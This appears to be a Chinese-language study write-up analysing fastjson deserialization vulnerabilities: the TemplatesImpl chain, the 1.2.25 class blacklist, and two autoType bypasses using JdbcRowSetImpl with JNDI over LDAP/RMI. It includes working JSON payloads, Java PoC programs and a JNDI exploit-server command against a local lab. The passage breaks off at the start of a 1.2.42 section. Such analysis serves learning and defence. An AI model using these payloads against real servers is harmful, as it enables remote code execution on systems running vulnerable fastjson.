![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680594202033-dc9f3a2c-1ced-4c47-9502-65b1dbf11ccc.png#averageHue=%23f9f6f5&clientId=u8272b843-0f56-4&from=paste&height=818&id=ub4654356&name=image.png&originHeight=1023&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=204152&status=done&style=none&taskId=ua3d301b2-2ec5-4f36-ab5a-5e3e178f6d8&title=&width=1534.4)
可以看到，逻辑是这样的：先判断`_bytecodes`是否为空，如果不为空，则执行后续的代码；后续的代码中，会调用到自定义的`ClassLoader`去加载`_bytecodes`中的`byte[]`，并对类的父类进行判断，如果是`ABSTRACT_TRANSLET`也就是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，那么就把类成员属性的`_transletIndex`设置成当前循环中的标记位，第一次调用的话，就是`class[0]`。
可以看到，这里的`_bytecodes`和`_outputProperties`都是类成员变量。同时，`_outputProperties`有自己的`getter`方法，也就是`getOutputProperties`。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680594021516-01ba0d37-4b23-4fec-965c-2b1bc267f9a6.png#averageHue=%23fbf7f6&clientId=u8272b843-0f56-4&from=paste&height=694&id=u6e694cd4&name=image.png&originHeight=868&originWidth=857&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=79396&status=done&style=none&taskId=u140ff6c7-e7d4-4dfd-90b3-87f1b763daf&title=&width=685.6)  
总结：说详细一点，`TemplatesImpl`利用链的整体思路如下：
构造一个`TemplatesImpl`类的反序列化字符串，其中`_bytecodes`是我们构造的恶意类的类字节码，这个类的父类是`AbstractTranslet`，最终这个类会被加载并使用`newInstance()`实例化。在反序列化过程中，由于`getter`方法`getOutputProperties()`满足条件，将会被`fastjson`调用，而这个方法触发了整个漏洞利用流程：`getOutputProperties()` -> `newTransformer()` -> `getTransletInstance()` -> `defineTransletClasses()` / `EvilClass.newInstance()`。
限制条件也很明显：需要代码中加了`Feature.SupportNonPublicField`。
## 2. fastjson 1.2.25 反序列化漏洞（学习JdbcRowSetImpl链的相关知识）
### （1）黑白名单机制介绍
众所周知，在`fastjson`自爆`1.2.24`版本的反序列化漏洞后，`1.2.25`版本就加入了黑白名单机制。
例如我们更换并下载`1.2.25`版本的`fastjson`，然后再去执行原来的`poc`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680602428789-1bd4d27c-554f-4f7d-ba10-70335c95979c.png#averageHue=%23f8f6ee&clientId=u8272b843-0f56-4&from=paste&height=685&id=u6a605695&name=image.png&originHeight=856&originWidth=1137&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=126619&status=done&style=none&taskId=ue1acbefb-caac-4575-bda5-3046c4afec8&title=&width=909.6)
就会提示我们`autoType is not support`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680602460437-b6fdf70e-144d-4fbf-a81a-0cdc6586e965.png#averageHue=%23f8f5f3&clientId=u8272b843-0f56-4&from=paste&height=815&id=uca9dbb44&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=286568&status=done&style=none&taskId=u1332263e-921c-4bf2-83fe-190f3bc94df&title=&width=1536)
查看源码可以发现这里定义了反序列化类的黑名单：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680604869097-81a97752-c1dd-4296-950f-0fd01d4930fc.png#averageHue=%23f9f7f5&clientId=u8272b843-0f56-4&from=paste&height=816&id=ueb7677c7&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=231734&status=done&style=none&taskId=ue12fd80e-38a9-418e-8256-aefa689e6e5&title=&width=1536)
具体如下：
```java
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```
接下来我们定位到`checkAutoType()`方法，看一下它的逻辑：如果开启了`autoType`，那么就先判断类名在不在白名单中，如果在就用`TypeUtils.loadClass`加载，如果不在就去匹配黑名单：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680605036525-87782994-bf9a-402e-b296-12fc30a4fbfb.png#averageHue=%23f9f6f4&clientId=u8272b843-0f56-4&from=paste&height=819&id=u21ab298d&name=image.png&originHeight=1024&originWidth=1629&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=193217&status=done&style=none&taskId=u1dcddc72-8c1a-4022-a3ca-963d93ef79f&title=&width=1303.2)
如果没开启`autoType`，则先匹配黑名单，然后再白名单匹配和加载；
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680611575004-0fd9b05b-be51-4d38-98c8-b4275ffb8d24.png#averageHue=%23faf7f5&clientId=u8272b843-0f56-4&from=paste&height=817&id=ud6928fab&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=208537&status=done&style=none&taskId=u427e137d-c780-4bfd-8c2d-127e1e67626&title=&width=1536)
最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了`autoType`或者`expectClass`不为空也就是指定了`Class`对象时才会调用`TypeUtils.loadClass`加载，否则`fastjson`会默认禁止加载该类。
我们跟进一下这里的`loadClass`方法：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680612305580-814698ec-124a-4163-ae33-7095c8652d77.png#averageHue=%23fbf9f7&clientId=u8272b843-0f56-4&from=paste&height=630&id=ucd579f2f&name=image.png&originHeight=787&originWidth=1309&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134082&status=done&style=none&taskId=u3db5682b-8f05-4cd7-b3e3-c39a95a5231&title=&width=1047.2)
问题就出在这里：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680612341139-7fe94d48-277e-42c7-a3db-fc3800c6a3d3.png#averageHue=%23faf7f5&clientId=u8272b843-0f56-4&from=paste&height=726&id=u046e0f4e&name=image.png&originHeight=907&originWidth=1915&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=216516&status=done&style=none&taskId=u255b3b53-4577-4571-9eae-fc3a74890ba&title=&width=1532)
我们来仔细看下上图红框中的代码，代码的含义是：如果类名的字符串以`[`开头，则说明该类是一个数组类型，需要递归调用`loadClass`方法来加载数组元素类型对应的`Class`对象，然后使用`Array.newIntrance`方法来创建一个空数组对象，最后返回该数组对象的`Class`对象；如果类名的字符串以`L`开头并以`;`结尾，则说明该类是一个普通的`Java`类，需要把开头的`L`和结尾的`;`给去掉，然后递归调用`loadClass`。
### （2）黑白名单绕过的复现
基于以上的分析，我们可以发现，只要我们把`payload`简单改一下就可以绕过。
我们需要先开启默认禁用的`autoType`，有以下三种方式：
```java
使用代码进行添加：ParserConfig.getGlobalInstance().addAccept("org.example.,org.javaweb.");或者ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.example.
在fastjson.properties中添加：fastjson.parser.autoTypeAccept=org.example.
```
我们先去`[https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)`下载个`JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`，然后启动利用工具：
```java
java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"
```
选择下面的`JDK 1.8`的：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680617239373-2a161464-b3a1-4d3f-8f8f-b4dc523ffe2a.png#averageHue=%231a1717&clientId=u8272b843-0f56-4&from=paste&height=268&id=u7e19c58f&name=image.png&originHeight=335&originWidth=1479&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51934&status=done&style=none&taskId=u05bf2652-312e-4b63-b411-b1aa678099a&title=&width=1183.2)
然后在`Main.java`中写入如下代码：
```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args) {
        String payload = "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\":\"ldap://127.0.0.1:1389/ppcjug\",\n" +
                "        \"autoCommit\":true\n" +
                "    }\n" +
                "}";
        JSON.parse(payload);
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680614580975-c77c8c3e-f26e-44bc-b944-bdb28504da0f.png#averageHue=%23f7f6f5&clientId=u8272b843-0f56-4&from=paste&height=818&id=u4433d1f9&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=242676&status=done&style=none&taskId=u5559770c-6f78-4d2b-8f00-46a2a5cfea4&title=&width=1536)
以上为第一种`poc`，在`JDK 8u181`下使用`ldap`测试成功，使用`rmi`测试失败。
除此之外，另一种`poc`则需要满足漏洞利用条件为`JDK 6u113`、`7u97` 和 `8u77`之前，例如我们这里重新新建一个项目，并从`[https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html)`处下载`jdk-8u65-windows-x64.exe`并安装。
然后利用新安装的`jdk 8u65`来启动`jndi exploit`：
```java
"C:\Program Files\Java\jdk1.8.0_65\bin\java.exe" -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"
```
导入`fastjson1.2.25`：
```java
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>fastjson_8u66_1_2_25</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.25</version>
        </dependency>
    </dependencies>
</project>
```
在`Main.java`中写入如下内容：
```java
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
        JSONObject.parse(payload);
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680692205068-d02f1d33-8459-4a31-a147-4cd5f3231b17.png#averageHue=%23f7f6f3&clientId=u8272b843-0f56-4&from=paste&height=823&id=ud8a5b648&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=258463&status=done&style=none&taskId=ua35ae797-9813-4f96-a233-755d5bd49e7&title=&width=1536)
### （3）对两种poc绕过手法的分析
首先来说说限制，基于`JNDI+RMI`或`JDNI+LADP`进行攻击，会有一定的`JDK`版本限制。
```java
RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113
LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680618501501-f26961a1-0027-40a3-ade6-8415e2b1c2d4.png#averageHue=%2395c7f8&clientId=u8272b843-0f56-4&from=paste&id=u043dac77&name=image.png&originHeight=441&originWidth=1250&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=153472&status=done&style=none&taskId=u5a11668f-49db-4182-92da-4147872a394&title=)
#### ①第一种poc（1.2.25-1.2.47通杀！！！）
然后我们先来看**第一种**`poc`。
我们仔细欣赏下第一种`poc`的`payload`：
```java
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1/exp","autoCommit":true}}
```
我们会发现，加上`{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}`就会绕过原本的`autoType`，由此我们可以猜测，针对未开启`autoType`的情况，`fastjson`的源代码中应该是有相关方法去针对处理的，并且利用我们的这种方式，正好可以对应上。
于是我们直接去查看源代码，翻到`checkAutoType`的地方，可以看到，如果没开启`autoType`，就会有以下两种加载方式：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680674920966-732fd782-4668-43e1-ab57-518011562ee9.png#averageHue=%23f9f6f4&clientId=u8272b843-0f56-4&from=paste&height=818&id=u0e63a7b2&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=222886&status=done&style=none&taskId=uc25d8b68-2fa3-4f6f-b967-be1c558c509&title=&width=1536)
第一种是从`mappings`里面获取，也就是上图中的第`727`行代码，点进去之后可以看到：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680675503367-43dbf581-5b0e-4015-a487-80393adc3525.png#averageHue=%23f9f7f5&clientId=u8272b843-0f56-4&from=paste&height=814&id=u23c92503&name=image.png&originHeight=1018&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235656&status=done&style=none&taskId=udb00512b-97b5-4dc2-a17c-9a854e30dcd&title=&width=1536)
如果获取不到就采用第二种方法，也就是第`728`-`730`行代码，从`deserializers`中获取。
`deserializers`是什么呢？可以看`fastjson-1.2.25.jar!\com\alibaba\fastjson\parser\ParserConfig.class`的第`172`-`241`行，里面是内置的一些类和对应的反序列化器。
但是`deserializers`是`private`类型的，我们搜索`deserializers.put`，发现当前类里面有一个`public`的`putDeserializer`方法，可以向`deserializers`中添加新数据：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680676108771-e490841e-0441-414e-9c9b-6576ab7d68ee.png#averageHue=%23f9f7f5&clientId=u8272b843-0f56-4&from=paste&height=818&id=u3c907910&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=216672&status=done&style=none&taskId=u7c1f0f64-f171-454a-b4f5-c10d8f20685&title=&width=1536)
于是我们全局搜索该方法，发现就一个地方调用了，而且没办法寻找利用链：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680677151929-7f9c95c7-40f3-42b7-9aa2-6aa9006a3203.png#averageHue=%23f5f1eb&clientId=u8272b843-0f56-4&from=paste&height=254&id=u1e390450&name=image.png&originHeight=318&originWidth=1141&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54312&status=done&style=none&taskId=u5ae08ae6-959f-44c7-988e-868b4e1c830&title=&width=912.8)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680677222460-54192f2d-d247-480a-bc53-a1212febd02f.png#averageHue=%23f9f7f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=ub9d96a5b&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=207736&status=done&style=none&taskId=u5bc96a3b-66e7-4e77-90cf-cb36de10fb1&title=&width=1536)
所以继续看第一种方法，从`mappings`获取的。可以看到，`mappings`这里也是`private`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678056676-759e117f-c793-4b66-a991-82536a9233df.png#averageHue=%23f9f7f4&clientId=u8272b843-0f56-4&from=paste&height=815&id=uab06c50b&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235080&status=done&style=none&taskId=u63292f58-ebad-4aa1-af92-dddaba04808&title=&width=1536)
搜索`mappings.put`，可以看到在`TypeUtils.loadClass`中有调用到：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678132990-8ab3025b-3eae-41c2-8576-5ec4e2151e55.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=819&id=uf9087d28&name=image.png&originHeight=1024&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210200&status=done&style=none&taskId=uaf540557-27de-4b01-9810-0fedd3a39be&title=&width=1536)
于是我们全局搜索，可以看到有如下五处调用：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678561460-ac869226-ef1c-46f8-b492-c66e23b48473.png#averageHue=%23f5f4eb&clientId=u8272b843-0f56-4&from=paste&height=510&id=u3fb653f7&name=image.png&originHeight=637&originWidth=729&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75537&status=done&style=none&taskId=ub8b45843-0788-4a52-9ff4-b9ff2a8adc5&title=&width=583.2)
我们一个个看。
第一个需要开启`autoType`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678666460-57c58d66-de2a-4cd8-91bc-3fd69a58362e.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=u10196591&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210453&status=done&style=none&taskId=u62527907-6716-41f7-b11b-cd1901f3082&title=&width=1536)
第二个要在白名单内，第三个要开启`autoType`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678713501-12502876-12ea-4865-bb64-51340931e820.png#averageHue=%23f9f6f4&clientId=u8272b843-0f56-4&from=paste&height=819&id=u866091a0&name=image.png&originHeight=1024&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=232619&status=done&style=none&taskId=u6cabfd27-4e98-4df7-b4c1-0d0d5a9f720&title=&width=1536)
第四个是在`MiscCodec.deserialze`中的，貌似没什么限制，我们先放一边：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678935307-61f42cbd-c46e-4ce1-aa11-e0d0797b376f.png#averageHue=%23faf8f8&clientId=u8272b843-0f56-4&from=paste&height=1213&id=u5b431c62&name=image.png&originHeight=1516&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=264604&status=done&style=none&taskId=uf5db69ca-015c-4266-988f-b07ed99f6c1&title=&width=1534.4)
第五个没办法利用，因为传不了参数，跳过：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679092354-59713c7a-a43d-4311-8f8e-eebb3ae03c5e.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=815&id=u843988d3&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=229811&status=done&style=none&taskId=u050bb634-6bbe-46f8-a87a-6e53a20ccfb&title=&width=1536)
也就是说，只能从`MiscCodec.deserialze`这里来寻找突破口了。
翻到`MiscCodec.java`的最上面可以看到，这个`MiscCodec`是继承了`ObjectSerializer`和`ObjectDeserializer`的：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679361943-4d3b8440-1d46-4762-b83b-d5db888b7d58.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=uba10225d&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=202138&status=done&style=none&taskId=ue202d417-765f-4a06-8fb7-d0b507c2102&title=&width=1536)
因此，可以判断，这个`MiscCodec`应该是个反序列化器，于是我们去之前的`deserializers`中看看都有谁用了：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679573424-d52e1ab6-6e6a-466d-bb4b-5cd24e2c7720.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=815&id=ucb42f24b&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=324362&status=done&style=none&taskId=u19623da7-4382-436c-8e01-4b27e8b2da2&title=&width=1536)
挺多的，结合`MiscCodec`中一堆的`if`语句，可以判断，一些简单的类都被放在这里了。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679621524-a1120b62-9948-44ba-a094-b3980e929f20.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=823&id=u0a81269b&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=196030&status=done&style=none&taskId=uaeae7b27-9ad8-40bd-9aa5-4ec45805273&title=&width=1536)
我们再来看这行代码：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680681095147-04871de3-d1b0-44e1-b6e7-b790e436c355.png#averageHue=%23f9f7f0&clientId=u8272b843-0f56-4&from=paste&height=798&id=u885c1731&name=image.png&originHeight=997&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=225172&status=done&style=none&taskId=u9068ac2d-dcc5-496e-b140-f277d1f3b1f&title=&width=1536)
然后跟进`strVal`，看看是哪儿来的：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680684014235-07a14705-5567-47ff-be0d-2a24462aff8f.png#averageHue=%23f9f8f2&clientId=u8272b843-0f56-4&from=paste&height=818&id=u11950ef5&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=219653&status=done&style=none&taskId=u58d97716-591e-45dc-b0b1-383a44c1c65&title=&width=1536)
继续跟进这个`objVal`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680684044565-316ed393-8cf7-40e6-8369-91ce95e250a4.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=817&id=u4942bea9&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=226587&status=done&style=none&taskId=u32a3cea6-c753-46c3-aff4-d787d4b28c0&title=&width=1536)
到这里就很明显了，那红框中的这段代码是什么意思呢？
首先，代码中的`if`语句判断当前解析器的状态是否为`TypeNameRedirect`，如果是，则进入`if`语句块中进行进一步的解析。在`if`语句块中，首先将解析器的状态设置为`NONE`，然后使用`parser.accept(JSONToken.COMMA)`方法接受一个逗号`Token`，以便后续的解析器对其进行处理。接下来，使用`lexer.token()`方法判断下一个`Token`的类型，如果是一个字符串，则进入if语句块中进行进一步的判断。在if语句块中，使用`lexer.stringVal()`方法获取当前`Token`的字符串值，并与`val`进行比较。如果不相等，则抛出一个`JSON`异常；如果相等，则使用`lexer.nextToken()`方法将`lexer`的指针指向下一个`Token`，然后使用`parser.accept(JSONToken.COLON)`方法接受一个冒号`Token`，以便后续的解析器对其进行处理。最后，使用`parser.parse()`方法解析当前`Token`，并将解析结果赋值给`objVal`。如果当前`Token`不是一个对象的结束符（右花括号），则使用`parser.accept(JSONToken.RBRACE)`方法接受一个右花括号`Token`，以便后续的解析器对其进行处理。如果当前解析器的状态不是`TypeNameRedirect`，则直接使用`parser.parse()`方法解析当前`Token`，并将解析结果赋值给`objVal`。
根据之前分析的，`objVal`会传给`strVal`，然后`TypeUtils.loadClass`在执行的过程中，会把`strVal`放到`mappings`缓存中。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680685220463-5e90e5ba-37f1-4fc1-b70e-70ccab72fc25.png#averageHue=%23fbfaf6&clientId=u8272b843-0f56-4&from=paste&height=83&id=u6a8d9b02&name=image.png&originHeight=104&originWidth=939&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14724&status=done&style=none&taskId=udd9cf6cb-81e3-4dea-a331-08d782f5c53&title=&width=751.2)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680686190404-6b1a2f02-0b09-4c96-ade4-0a593f179ae0.png#averageHue=%23f9f8f3&clientId=u8272b843-0f56-4&from=paste&height=832&id=u88a62e2c&name=image.png&originHeight=1040&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=221198&status=done&style=none&taskId=ua7860cce-d16a-45f6-b3ff-dbc9cc39e09&title=&width=1536)
加载到缓存中以后，在下一次`checkAutoType`的时候，直接就返回了，绕过了检验的部分直接执行：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680686570779-d1530da3-d33d-4445-ac30-aca768ef8c78.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=818&id=u1fc011e7&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=240527&status=done&style=none&taskId=ue054fb0f-6d71-41fe-a1c3-d50aca03796&title=&width=1536)
#### ②第二种poc
第二种`poc`的绕过手法在上面的“黑白名单机制介绍”中已经写的很清楚了，直接参考即可。
需要注意的是，由于代码是循环去掉`L`和`;`的，所以我们不一定只在头尾各加一个`L`和`;`。
由于1.2.25的代码中有如下代码：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680707261437-1f39a0de-3978-4950-90bd-ec8832701c83.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=819&id=u10bf0ebc&name=image.png&originHeight=1024&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=228052&status=done&style=none&taskId=u174e90ae-3a98-41a5-95c0-f8d68c6a1d8&title=&width=1535.2)
因此我们可以构造如下`poc`：
```java
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"a\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{, \"dataSourceName\":\"ldap://127.0.0.1:1389/ift2ty\", \"autoCommit\":true}}";
        JSONObject.parse(payload);
    }
}
```
也可以绕过：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680707199621-7543e63d-9d09-49ec-b393-dd53f474167c.png#averageHue=%23f7f6f4&clientId=u8272b843-0f56-4&from=paste&height=823&id=ub2bbcd38&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=249063&status=done&style=none&taskId=u898cebbe-9534-4434-bdf4-00572e66baa&title=&width=1536)
### （4）关于JdbcRowSetImpl链利用的分析
从上面我们学习了绕过黑白名单的学习，接下来看`JdbcRowSetImpl`利用链的原理。
根据`FastJson`反序列化漏洞原理，`FastJson`将`JSON`字符串反序列化到指定的`Java`类时，会调用目标类的`getter`、`setter`等方法。`JdbcRowSetImpl`类的`setAutoCommit()`会调用`connect()`方法，`connect()`函数如下：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680703249472-7e9a45dd-3070-4406-a6da-47f43f419fa3.png#averageHue=%23f8f7f4&clientId=u8272b843-0f56-4&from=paste&height=814&id=uc91bdc8b&name=image.png&originHeight=1018&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=208033&status=done&style=none&taskId=ufaf4f9a4-8120-49d5-86d6-b40ceb8fea4&title=&width=1535.2)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680703278497-77fe86b9-cb73-4eff-9283-9627c8038964.png#averageHue=%23f8f4d5&clientId=u8272b843-0f56-4&from=paste&height=814&id=ub640fc04&name=image.png&originHeight=1018&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235897&status=done&style=none&taskId=uaf7d108c-c2a7-4c49-94ad-64ab7612335&title=&width=1536)
我们把这段代码单独拿出来分析：
```java
private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
```
一眼就看到了两行异常熟悉的代码：
```java
InitialContext var1 = new InitialContext();
DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
```
我们可以通过一个简单的小`demo`快速了解：
```java
package org.example;
import com.sun.rowset.JdbcRowSetImpl;

public class Main {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();
        JdbcRowSetImpl_inc.setDataSourceName("rmi://127.0.0.1:1099/ift2ty");
        JdbcRowSetImpl_inc.setAutoCommit(true);
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680704636327-d3f73ea9-ba77-4dae-9497-adf85d3dca46.png#averageHue=%23f7f6f4&clientId=u8272b843-0f56-4&from=paste&height=814&id=u2def4e4a&name=image.png&originHeight=1017&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=218638&status=done&style=none&taskId=u0024ec07-8c87-4c38-b19f-5f9cb1d75a7&title=&width=1536)
所以之前的两种`poc`可以直接自定义`uri`利用成功。
## 3. fastjson 1.2.42 反序列化漏洞
首先先下载`fastjson 1.2.42`：
```java
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
